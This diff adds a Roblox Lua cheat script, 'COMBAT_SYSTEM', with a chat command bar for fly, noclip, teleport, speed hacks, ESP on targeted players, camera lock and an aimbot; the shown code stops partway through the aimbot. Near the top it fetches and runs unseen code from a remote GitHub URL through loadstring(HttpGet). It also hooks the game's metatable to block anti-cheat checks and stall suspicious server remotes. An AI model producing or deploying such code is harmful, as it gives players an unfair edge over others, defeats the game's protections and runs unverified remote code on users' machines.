@@ -1,0 +1,1244 @@
+COMBAT_SYSTEM = {
+	Commands = {}
+}
+
+_G.combatsystem = COMBAT_SYSTEM
+
+local PREFIX = "/"
+local Shift = false
+local player = game.Players.LocalPlayer
+local gotodebounce = false
+local camlockplr = nil
+local flying = false
+local firstfly = true
+local goto = false
+local noclip = false
+local gotocheck = false
+local check = true
+local LocalPlayer = game.Players.LocalPlayer
+local mouse = LocalPlayer:GetMouse()
+local input = game:GetService('UserInputService')
+local x,y,z = 0,0,0
+local e = false
+local JumpingStateDebounce = false
+local CMDBAR = Instance.new("ScreenGui")
+local Bar = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+CMDBAR.Name = "CMDBAR"
+CMDBAR.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+CMDBAR.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+CMDBAR.ResetOnSpawn = false
+Bar.Name = "Bar"
+Bar.Parent = CMDBAR
+Bar.AnchorPoint = Vector2.new(0.5, 0.5)
+Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Bar.BackgroundTransparency = 0.500
+Bar.BorderSizePixel = 0
+Bar.Position = UDim2.new(0.5, 0, 0.499904662, 0)
+Bar.Size = UDim2.new(2, 0, 0, 30)
+TextBox.Parent = Bar
+TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 1.000
+TextBox.Position = UDim2.new(0.499715418, 0, 0.5, 0)
+TextBox.Size = UDim2.new(0, 200, 0, 30)
+TextBox.Font = Enum.Font.SourceSansSemibold
+TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.PlaceholderText = "PREFIX: "..PREFIX
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 28.000
+TextBox.TextXAlignment = "Center"
+
+pcall(function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/TeamExpo/key/master/key1'),true))()
+end)
+pcall(function()
+local gamelememe = getrawmetatable(game)
+local Closure, Caller = hide_me or newcclosure, checkcaller or is_protosmasher_caller or Cer.isCerus
+local writeable = setreadonly(gamelememe, false) or make_writeable(gamelememe)
+local name, index, nindex = gamelememe.__namecall, gamelememe.__index, gamelememe.__newindex
+local meta = getrawmetatable(game)
+local namecall = meta.__namecall
+local newindex = meta.__newindex
+local index = meta.__index
+local fakemodel = Instance.new("Model")
+fakemodel.Parent = game.Workspace
+fakehumanoid = Instance.new("Humanoid")
+
+gamelememe.__newindex = Closure(function(self, Property, b)
+	if not Caller() then
+		if self:IsA'Humanoid' then 
+			game:GetService'StarterGui':SetCore('ResetButtonCallback', true)
+			if Property == "WalkSpeed" then 
+				return
+			end
+			if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
+				return 
+			end
+		end
+		if Property == "CFrame" and self.Name == "HumanoidRootPart" or self.Name == "Torso" then
+			return 
+		end
+	end
+	return nindex(self, Property, b)
+end)
+
+gamelememe.__namecall = Closure(function(self, ...)
+	if not Caller() then
+		local Arguments = {
+			...
+		}
+		if getnamecallmethod() == "Destroy" and tostring(self) == "BodyPosition" or getnamecallmethod() == "Destroy" and tostring(self) == "BodyVelocity" then
+			return invalidfunctiongang(self, ...)
+		end
+		if getnamecallmethod() == "BreakJoints" and tostring(self) == game:GetService'Players'.LocalPlayer.Character.Name then
+			return invalidfunctiongang(self, ...)
+		end
+		if getnamecallmethod() == "FireServer" then 
+			if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
+				return wait(9e9)
+			end
+			if Arguments[1] == "hey" then 
+				return wait(9e9)
+			end
+		end
+	end
+	return name(self, ...)
+end)
+end)
+
+
+function ParseMessage(Message)
+	local Arguments = {}
+	Message = string.lower(Message)
+	local PrefixMatch = string.match(Message, "^"..PREFIX)
+	if PrefixMatch then
+		Message = string.gsub(Message, PrefixMatch, "", 1)
+		for Argument in string.gmatch(Message, "[^%s]+") do
+			table.insert(Arguments, Argument)
+		end
+	end
+	return Arguments
+end
+function notification(text)
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "COMBAT SYSTEM";   
+		Text = text;
+		Icon = "rbxassetid://4452245157"; 
+		Duration = 1;
+	})
+end
+function COMBAT_SYSTEM:AddCommand(commandname, cmddesc, sc)
+	local cmdinformation = {
+		commandname
+	}
+	if sc == nil then
+		sc = cmddesc
+		cmddesc = nil
+		table.insert(cmdinformation, sc)
+	else
+		table.insert(cmdinformation, cmddesc)
+		table.insert(cmdinformation, sc)
+	end
+	table.insert(COMBAT_SYSTEM.Commands, cmdinformation)
+end
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+	local IsACmd = false
+	msg:lower()
+	if msg:sub(1, 3) == "/e " then
+		msg = msg:sub(4)
+	end
+	local args = ParseMessage(msg)
+	for i, cmd in pairs(COMBAT_SYSTEM.Commands) do
+		if args[1] == cmd[1] then
+			IsACmd = true
+			table.remove(args, 1)
+			if type(cmd[3]) == "function" then
+				cmd[3](args)
+			else
+				cmd[2](args)
+			end
+		end
+	end
+	if not IsACmd then
+		notification(args[1].." Is not a command!")
+	end
+end)
+Bar.Visible = false
+local UIS = game:GetService("UserInputService")
+local cntrl = false
+local visible = false
+UIS.InputBegan:Connect(function(input,proc)
+		if not proc then
+			if input.KeyCode.Name == "Semicolon" then
+				visible = true
+				Bar.Visible = true
+				TextBox.Text = ""
+				wait()
+				TextBox:CaptureFocus()
+			end
+		end
+	end)
+UIS.InputEnded:Connect(function(input)
+	if input.KeyCode.Name == "LeftAlt" then
+		cntrl = false
+	end
+end)
+TextBox.FocusLost:Connect(function(w)
+	local IsACmd = false
+	if w == true then
+		Bar.Visible = false
+		local text = TextBox.Text:lower()
+		if text ~= "" or text ~= " " or text ~= nil then
+			if text:sub(1, 1) ~= PREFIX then
+				text = PREFIX..text
+			end
+			local args = ParseMessage(text)
+			for i, cmd in pairs(COMBAT_SYSTEM.Commands) do
+				if args[1] == cmd[1] then
+					IsACmd = true
+					table.remove(args, 1)
+					if type(cmd[3]) == "function" then
+						cmd[3](args)
+					else
+						cmd[2](args)
+					end
+				end
+			end
+			if not IsACmd then
+				notification(args[1].." Is not a command!")
+			end
+		end
+	end
+end)
+
+local function togglefly()
+	flying = not flying
+	if flying then
+		if LocalPlayer.Character ~= nil then
+			if LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChild("Humanoid") then
+				local Float = Instance.new('Part', LocalPlayer.Character)
+				Float.Name = "Float"
+				Float.Transparency = 1
+				Float.Size = Vector3.new(6, 1, 6)
+				Float.Anchored = true
+				LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				local T = LocalPlayer.Character.HumanoidRootPart
+				local CONTROL = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0
+				}
+				local lCONTROL = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0
+				}
+				local SPEED = 0
+				local function FLY()
+					FLYING = true
+					local BG = Instance.new('BodyGyro', T)
+					local BV = Instance.new('BodyVelocity', T)
+					BG.P = 9e4
+					BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+					BG.cframe = T.CFrame
+					BV.velocity = Vector3.new(0, 0.1, 0)
+					BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+					spawn(function()
+						repeat
+							wait()
+							if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
+								SPEED = 50
+							elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
+								SPEED = 0
+							end
+							if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
+								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+								lCONTROL = {
+									F = CONTROL.F,
+									B = CONTROL.B,
+									L = CONTROL.L,
+									R = CONTROL.R
+								}
+							elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
+								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+							else
+								BV.velocity = Vector3.new(0, 0.1, 0)
+							end
+							BG.cframe = workspace.CurrentCamera.CoordinateFrame
+						until not FLYING
+						CONTROL = {
+							F = 0,
+							B = 0,
+							L = 0,
+							R = 0
+						}
+						lCONTROL = {
+							F = 0,
+							B = 0,
+							L = 0,
+							R = 0
+						}
+						SPEED = 0
+						BG:destroy()
+						BV:destroy()
+					end)
+				end
+				mouse.KeyDown:connect(function(KEY)
+					if KEY:lower() == 'w' then
+						CONTROL.F = fspeed
+					elseif KEY:lower() == 's' then
+						CONTROL.B = -fspeed
+					elseif KEY:lower() == 'a' then
+						CONTROL.L = -fspeed 
+					elseif KEY:lower() == 'd' then 
+						CONTROL.R = fspeed
+					end
+				end)
+				mouse.KeyUp:connect(function(KEY)
+					if KEY:lower() == 'w' then
+						CONTROL.F = 0
+					elseif KEY:lower() == 's' then
+						CONTROL.B = 0
+					elseif KEY:lower() == 'a' then
+						CONTROL.L = 0
+					elseif KEY:lower() == 'd' then
+						CONTROL.R = 0
+					end
+				end)
+				FLY()
+				LocalPlayer.Character.HumanoidRootPart.Anchored = false
+			elseif LocalPlayer.Character:FindFirstChild("Torso") and LocalPlayer.Character:FindFirstChild("Humanoid") then
+				local Float = Instance.new('Part', LocalPlayer.Character)
+				Float.Name = "Float"
+				Float.Transparency = 1
+				Float.Size = Vector3.new(6, 1, 6)
+				Float.Anchored = true
+				LocalPlayer.Character.Torso.Anchored = true
+				local T = LocalPlayer.Character.Torso
+				local CONTROL = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0
+				}
+				local lCONTROL = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0
+				}
+				local SPEED = 0
+				local function FLY()
+					FLYING = true
+					local BG = Instance.new('BodyGyro', T)
+					local BV = Instance.new('BodyVelocity', T)
+					BG.P = 9e4
+					BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+					BG.cframe = T.CFrame
+					BV.velocity = Vector3.new(0, 0.1, 0)
+					BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+					spawn(function()
+						repeat
+							wait()
+							if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
+								SPEED = 50
+							elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
+								SPEED = 0
+							end
+							if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
+								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+								lCONTROL = {
+									F = CONTROL.F,
+									B = CONTROL.B,
+									L = CONTROL.L,
+									R = CONTROL.R
+								}
+							elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
+								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+							else
+								BV.velocity = Vector3.new(0, 0.1, 0)
+							end
+							BG.cframe = workspace.CurrentCamera.CoordinateFrame
+						until not FLYING
+						CONTROL = {
+							F = 0,
+							B = 0,
+							L = 0,
+							R = 0
+						}
+						lCONTROL = {
+							F = 0,
+							B = 0,
+							L = 0,
+							R = 0
+						}
+						SPEED = 0
+						BG:destroy()
+						BV:destroy()
+					end)
+				end
+				mouse.KeyDown:connect(function(KEY)
+					if KEY:lower() == 'w' then
+						CONTROL.F = fspeed
+					elseif KEY:lower() == 's' then
+						CONTROL.B = -fspeed
+					elseif KEY:lower() == 'a' then
+						CONTROL.L = -fspeed 
+					elseif KEY:lower() == 'd' then 
+						CONTROL.R = fspeed
+					end
+				end)
+				mouse.KeyUp:connect(function(KEY)
+					if KEY:lower() == 'w' then
+						CONTROL.F = 0
+					elseif KEY:lower() == 's' then
+						CONTROL.B = 0
+					elseif KEY:lower() == 'a' then
+						CONTROL.L = 0
+					elseif KEY:lower() == 'd' then
+						CONTROL.R = 0
+					end
+				end)
+				FLY()
+				LocalPlayer.Character.Torso.Anchored = false
+			end
+		end
+	else
+		if LocalPlayer.Character then
+			if LocalPlayer.Character:FindFirstChild("Float") then
+				LocalPlayer.Character:FindFirstChild("Float"):Destroy()
+			end
+		end
+		local AnimationTracks = LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
+		for i, track in pairs (AnimationTracks) do
+			if track.Name ~= "WalkAnim" then
+				track:Stop()
+			end
+		end
+		FLYING = false
+	end
+end
+local function goto(cframe)
+    if player.Character ~= nil and gotocheck == false then
+		gotocheck = true
+        if flying then
+            togglefly()
+        end
+        if player.Character:FindFirstChild("Torso") then
+            local previouspos = player.Character.Torso.CFrame
+            player.Character.Torso.CFrame = cframe
+            wait(0.3)
+            player.Character.Torso.CFrame = player.Character.Torso.CFrame * CFrame.new(0,0,1)
+            wait(0.1)
+            player.Character.Torso.CFrame = player.Character.Torso.CFrame * CFrame.new(0,0,-1)
+            wait(0.15)
+            player.Character.Torso.CFrame = previouspos
+        end
+		gotocheck = false
+    end
+end
+function psearch(arg)
+	local plr
+	for i, v in pairs(game.Players:GetPlayers()) do 
+		if string.lower(string.sub(v.Name, 1, string.len(arg))) == string.lower(arg) then
+			plr = v
+		elseif arg == "me" then
+			plr = game.Players.LocalPlayer
+		end
+	end
+	if plr then
+		return plr
+	else
+		notification("Player could not be found!")
+	end
+end
+local parts = {}
+for i, v in pairs(workspace:GetDescendants()) do
+	if v:IsA("Part") then
+		table.insert(parts, v)
+	end
+end
+
+
+function teleport(position)
+	position = position + Vector3.new(0, 3, 0)
+	local BP = Instance.new("BodyPosition")
+	BP.MaxForce = Vector3.new(10000, 10000, 10000)
+	BP.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+	BP.Position = position
+	for i, v in pairs(parts) do
+		v.CanCollide = false
+	end
+	repeat
+		wait()
+	until (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - position).Magnitude <= 10
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position)
+	if BP then
+		BP:Destroy()
+	end
+	for i, v in pairs(parts) do
+		v.CanCollide = true
+	end
+end
+
+
+
+
+---------------------------------------------------
+-------------------AUTOMATION----------------------
+				---------------
+				
+--Auto van removal, Added pcall for prison users		
+pcall(function()
+if workspace:FindFirstChild("Armoured Truck") then 
+	workspace:FindFirstChild("Armoured Truck"):Remove()
+end
+end)
+
+
+--Default Fly speed value goes here, you can change the flyspeed with the K & L keybinds
+fspeed = 3
+
+
+--Blink speed value goes here, Shiftlock must be disabled
+speed = 2
+
+
+--Chatframe
+local chatFrame = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible=true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+
+
+
+	for i,v in pairs(game.Workspace:GetDescendants()) do
+		if v:IsA("VehicleSeat") or v:IsA("Seat") then
+			v:Destroy()
+		end
+	end
+
+
+---------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+-------------------------------------------------
+-------------------COMMANDS----------------------
+				---------------
+
+COMBAT_SYSTEM:AddCommand("print", "This is primarily used for testing", function(args)
+	local msg = table.concat(args, " ")
+	print(msg)
+end)
+
+COMBAT_SYSTEM:AddCommand("rejoin", "Rejoins the game that you're in.", function()
+	local ts = game:GetService("TeleportService")
+	local p = game:GetService("Players").LocalPlayer
+	ts:Teleport(game.PlaceId, p)
+end)
+
+
+
+COMBAT_SYSTEM:AddCommand("goto", "Teleport to a player", function(args)
+	local plr = psearch(args[1])
+	if flying then
+		togglefly()
+	end
+	LocalPlayer.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame
+end)
+
+
+COMBAT_SYSTEM:AddCommand("ws", "Changes Walkspeed", function(args)
+	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = args[1]
+	var1 = args[1]
+	player.CharacterAdded:Connect(function(character)
+		wait(0.5)
+		player.Character.Humanoid.WalkSpeed = var1
+	end)
+end)
+	
+COMBAT_SYSTEM:AddCommand("jp", "Changes Jumppower", function(args)
+	game.Players.LocalPlayer.Character.Humanoid.JumpPower = args[1]
+	var2 = args[1]
+	player.CharacterAdded:Connect(function(character)
+		wait(0.5)
+		player.Character.Humanoid.JumpPower = var2
+	end)
+end)
+
+COMBAT_SYSTEM:AddCommand("hunt", "loop find", function(args)
+	local target = psearch(args[1])
+	local billgui = Instance.new('BillboardGui', target.Character.Head)
+	local textlab = Instance.new('TextLabel', billgui)
+	
+	billgui.Name = "ESP"
+	billgui.Adornee  = epic
+	billgui.AlwaysOnTop = true
+	billgui.ExtentsOffset = Vector3.new(0, 3, 0)
+	billgui.Size = UDim2.new(0, 5, 0, 5)
+		
+	textlab.Name = 'Target'
+	textlab.BackgroundColor3 = Color3.new(255, 255, 255)
+	textlab.BackgroundTransparency = 1
+	textlab.BorderSizePixel = 0
+	textlab.Position = UDim2.new(0, 0, 0, -40)
+	textlab.Size = UDim2.new(1, 0, 10, 0)
+	textlab.Visible = true
+	textlab.ZIndex = 10
+	textlab.Font = 'ArialBold'
+	textlab.FontSize = 'Size18'
+	textlab.Text = target.Name
+	textlab.TextColor = BrickColor.new('Bright green') --color here https://developer.roblox.com/en-us/articles/BrickColor-Codes
+	textlab.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	textlab.TextStrokeTransparency = 0.6
+	
+	
+	target.CharacterAdded:Connect(function(char)
+		wait()
+		local billgui = Instance.new('BillboardGui', char.Head)
+		local textlab = Instance.new('TextLabel', billgui)
+	
+		billgui.Name = "ESP"
+		billgui.Adornee  = epic
+		billgui.AlwaysOnTop = true
+		billgui.ExtentsOffset = Vector3.new(0, 3, 0)
+		billgui.Size = UDim2.new(0, 5, 0, 5)
+		
+		textlab.Name = 'Target'
+		textlab.BackgroundColor3 = Color3.new(255, 255, 255)
+		textlab.BackgroundTransparency = 1
+		textlab.BorderSizePixel = 0
+		textlab.Position = UDim2.new(0, 0, 0, -40)
+		textlab.Size = UDim2.new(1, 0, 10, 0)
+		textlab.Visible = true
+		textlab.ZIndex = 10
+		textlab.Font = 'ArialBold'
+		textlab.FontSize = 'Size18'
+		textlab.Text = target.Name
+		textlab.TextColor = BrickColor.new('Bright green') --https://developer.roblox.com/en-us/articles/BrickColor-Codes :)
+		textlab.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+		textlab.TextStrokeTransparency = 0.6
+	end)
+end)
+
+COMBAT_SYSTEM:AddCommand("huntg", "loop find group (id)", function(args)
+	local marketplace = game:GetService("MarketplaceService")
+	if type(tonumber(args[1])) == "number" then
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v:IsInGroup(args[1]) then
+				for i,x in pairs(COMBAT_SYSTEM.Commands) do
+					if x[1] == "hunt" then
+						x[3]({v.Name})
+					end
+				end
+			end
+		end
+	end
+end)
+
+local camlockplr = nil
+	
+game.Players.PlayerRemoving:Connect(function(plr)
+	if plr.Name == camlockplr then
+		camlockplr = nil
+	end
+end)
+
+COMBAT_SYSTEM:AddCommand("cl", "camlock target", function(args)
+	local target = psearch(args[1])
+	if target ~= nil and target ~= "" then
+		local player = target
+		camlockplr = player
+	end
+end)
+COMBAT_SYSTEM:AddCommand("uncl", "uncamlock target", function(args)
+	camlockplr = nil
+end)
+	
+
+COMBAT_SYSTEM:AddCommand("j1", "Jump flip animation", function(args)
+		for _, v in pairs(game.Players.LocalPlayer.Character.Animate.jump:GetChildren()) do
+		v.AnimationId = 'rbxassetid://538512152'
+	end
+end)
+
+
+COMBAT_SYSTEM:AddCommand("z2", "Gun animation", function(args)
+
+	local lplr = game:GetService("Players").LocalPlayer
+	local shotty = lplr.Backpack:FindFirstChild("Shotty")
+	local Animation = Instance.new("Animation")
+	Animation.AnimationId = "rbxassetid://503259904"
+	local plr = game:GetService('Players').LocalPlayer
+	local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
+	shotty.Equipped:connect(function()
+		wait(.1)
+		HUM:Play()
+		HUM:AdjustSpeed(0.0)
+	end)
+	shotty.Unequipped:connect(function()
+		HUM:Stop()
+	end)
+	
+	
+	local lplr = game:GetService("Players").LocalPlayer
+	local Glock = lplr.Backpack:FindFirstChild("Glock")
+	local Animation = Instance.new("Animation")
+	Animation.AnimationId = "rbxassetid://503259904"
+	local plr = game:GetService('Players').LocalPlayer
+	local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
+	Glock.Equipped:connect(function()
+		wait(.1)
+		HUM:Play()
+		HUM:AdjustSpeed(0.0)
+	end)
+	Glock.Unequipped:connect(function()
+		HUM:Stop()
+
+	end)
+end)
+
+
+COMBAT_SYSTEM:AddCommand("fov", "Change fov", function(args)
+	local val1 = args[1]
+	game:GetService'Workspace'.Camera.FieldOfView = val1
+end)
+
+
+COMBAT_SYSTEM:AddCommand("uzi","Buys Uzi",function(args)
+goto(game.Workspace["Uzi | $150"].Head.CFrame)
+end)
+	
+COMBAT_SYSTEM:AddCommand("glock","Buys Glock",function(args)
+goto(game.Workspace["Glock | $200"].Head.CFrame)
+end)	
+	
+	
+	
+COMBAT_SYSTEM:AddCommand("noclip","walk through wall",function(args)
+	noclip = true 
+	notification("Noclip Enable")
+	end)
+	
+COMBAT_SYSTEM:AddCommand("unnoclip","unnoclip wall",function(args)
+	noclip = false 
+	notification("Noclip Disable")
+	end)
+	
+
+--Keybinds!!!!
+mouse.KeyDown:Connect(function(key)
+	if key == "l" then
+		fspeed = fspeed + 1
+		notification("flyspeed now: "..fspeed)
+	end
+end)
+mouse.KeyDown:Connect(function(key)
+	if key == "r" then
+		goto(game.Workspace["Buy Ammo | $25"].Head.CFrame)
+	end
+end)
+mouse.KeyDown:Connect(function(key)
+	if key == "k" then
+		fspeed = fspeed - 1
+		notification("flyspeed now: "..fspeed)
+	end
+end)
+
+
+mouse.KeyDown:Connect(function(key)
+    if key == "0" then
+        e = true
+    end
+end)
+
+mouse.KeyUp:Connect(function(key)
+    if key == "0" then
+        e = false
+    end
+end)
+
+mouse.KeyDown:Connect(function(key)
+	if key == "keyhere" then
+		--script here
+	end
+end)
+	
+
+	
+
+
+input.InputBegan:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.W then
+			z = -speed	
+		end
+	end
+end)
+
+input.InputBegan:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.S then
+			z = speed	
+		end
+	end
+end)
+
+input.InputBegan:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.A then
+			x = -speed	
+		end
+	end
+end)
+
+input.InputBegan:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.D then
+			x = speed	
+		end
+	end
+end)
+
+input.InputEnded:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.W then
+			z = 0
+		end
+	end
+end)
+
+input.InputEnded:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.S then
+			z = 0
+		end
+	end
+end)
+
+input.InputEnded:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.A then
+			x = 0
+		end
+	end
+end)
+
+input.InputEnded:connect(function(k)
+	if k.UserInputType == Enum.UserInputType.Keyboard then
+		if k.KeyCode == Enum.KeyCode.D then
+			x = 0
+		end
+	end
+end)
+
+
+
+
+
+
+game:GetService("UserInputService").InputBegan:Connect(function(inputObject, gameProcessedEvent)
+	if inputObject.KeyCode == Enum.KeyCode.H and gameProcessedEvent == false then
+		if firstfly then
+			firstfly = false
+		end
+		togglefly()
+	end
+end)
+
+
+--If statements goes here if you understand them
+game:GetService('RunService').Stepped:connect(function()
+	 
+	if e == true then
+	player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(x,y,z)
+	end
+
+	if noclip == true then
+	        if game.Players.LocalPlayer.Character ~= nil then
+	            if game.Players.LocalPlayer.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+	                game.Players.LocalPlayer.Character.Head.CanCollide = false
+	                game.Players.LocalPlayer.Character.Torso.CanCollide = false
+	                game.Players.LocalPlayer.Character.Humanoid.Sit = false
+	            end
+	        end
+		end
+		
+	
+	if flying then
+		if LocalPlayer.Character then
+			if LocalPlayer.Character:FindFirstChild("Humanoid") then
+				LocalPlayer.Character.Humanoid.PlatformStand = false
+				LocalPlayer.Character.Humanoid.Sit = false
+				LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
+			end
+			if LocalPlayer.Character:FindFirstChild("Float") then
+				LocalPlayer.Character:FindFirstChild("Float").CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
+			end
+		end
+	end
+
+
+
+	if camlockplr ~= nil then
+		if camlockplr.Character ~= nil then
+			if camlockplr.Character:FindFirstChild("Head") then
+				game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, camlockplr.Character.Head.CFrame.p)
+			end
+		end
+	end
+
+
+
+	if flying and not JumpingStateDebounce then
+		JumpingStateDebounce = true
+		if LocalPlayer.Character then
+			if LocalPlayer.Character:FindFirstChild("Humanoid") then
+				if check then
+					wait()
+					LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+				end
+			end
+		end
+		JumpingStateDebounce = false
+	end
+
+
+
+end)
+
+	
+local AimbotEnabled = false
+	
+	local ms = game.Players.LocalPlayer:GetMouse()
+	local uis = game:GetService("UserInputService")
+	local target
+	local selectingtarget
+	
+	local Aimbot = Instance.new("ScreenGui")
+	local TextBox = Instance.new("TextBox")
+	Aimbot.Name = "Aimbot"
+	Aimbot.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	Aimbot.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	Aimbot.ResetOnSpawn = false
+	TextBox.Parent = Aimbot
+	TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
+	TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	TextBox.BackgroundTransparency = 0.500
+	TextBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
+	TextBox.BorderSizePixel = 3
+	TextBox.Position = UDim2.new(0.884, 0, 0.943, 0)
+	TextBox.Size = UDim2.new(0, 100, 0, 30)
+	TextBox.Font = Enum.Font.SourceSans
+	TextBox.PlaceholderText = "RMB to Select"
+	TextBox.Text = ""
+	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextBox.TextScaled = true
+	TextBox.TextSize = 14.000
+	TextBox.TextWrapped = true
+	TextBox.Draggable = true
+	TextBox.Selectable = true
+	TextBox.Active = true
+	
+	
+	function ms2plr()
+		local plr
+	    local closest = 25
+	    for i,v in pairs(game.Players:GetPlayers()) do
+			if v.Character then
+				local root = v.Character:FindFirstChild("Torso")
+				if root then
+					if (root.Position - Vector3.new(ms.Hit.X,ms.Hit.Y,ms.Hit.Z)).Magnitude < closest then
+						closest = (root.Position - Vector3.new(ms.Hit.X,ms.Hit.Y,ms.Hit.Z)).Magnitude
+						plr = v
+					end
+				end
+			end
+	    end
+		if plr ~= game.Players.LocalPlayer then
+			return plr
+		end
+	end
+
+
+	function CreateSelection(tgrt)
+		if tgrt.Character then
+			if not tgrt.Character["Torso"]:FindFirstChild("Selection") then
+				local selection = Instance.new("Part")
+				selection.Anchored = true
+				selection.Size = Vector3.new(6, 9, 6)
+				selection.BrickColor = BrickColor.new("Bright green") --https://developer.roblox.com/en-us/articles/BrickColor-Codes 
+				selection.Transparency = 0.7
+				selection.Parent = tgrt.Character["Torso"]
+				selection.Position = tgrt.Character["Torso"].Position
+				selection.CanCollide = false
+				selection.Name = "Selection"
+				return selection
+			end
+		end
+	end
+	
+	uis.InputBegan:Connect(function(input,proc)
+		if not proc then
+			if input.KeyCode.Name == "B" then
+				if AimbotEnabled == false then
+					AimbotEnabled = true
+					notification("Aimbot enabled!")
+				else
+					AimbotEnabled = false
+					notification("Aimbot disabled!")
+				end
+			end
+			if input.KeyCode.Name == "E" then
+				if game.Players.LocalPlayer.Character then
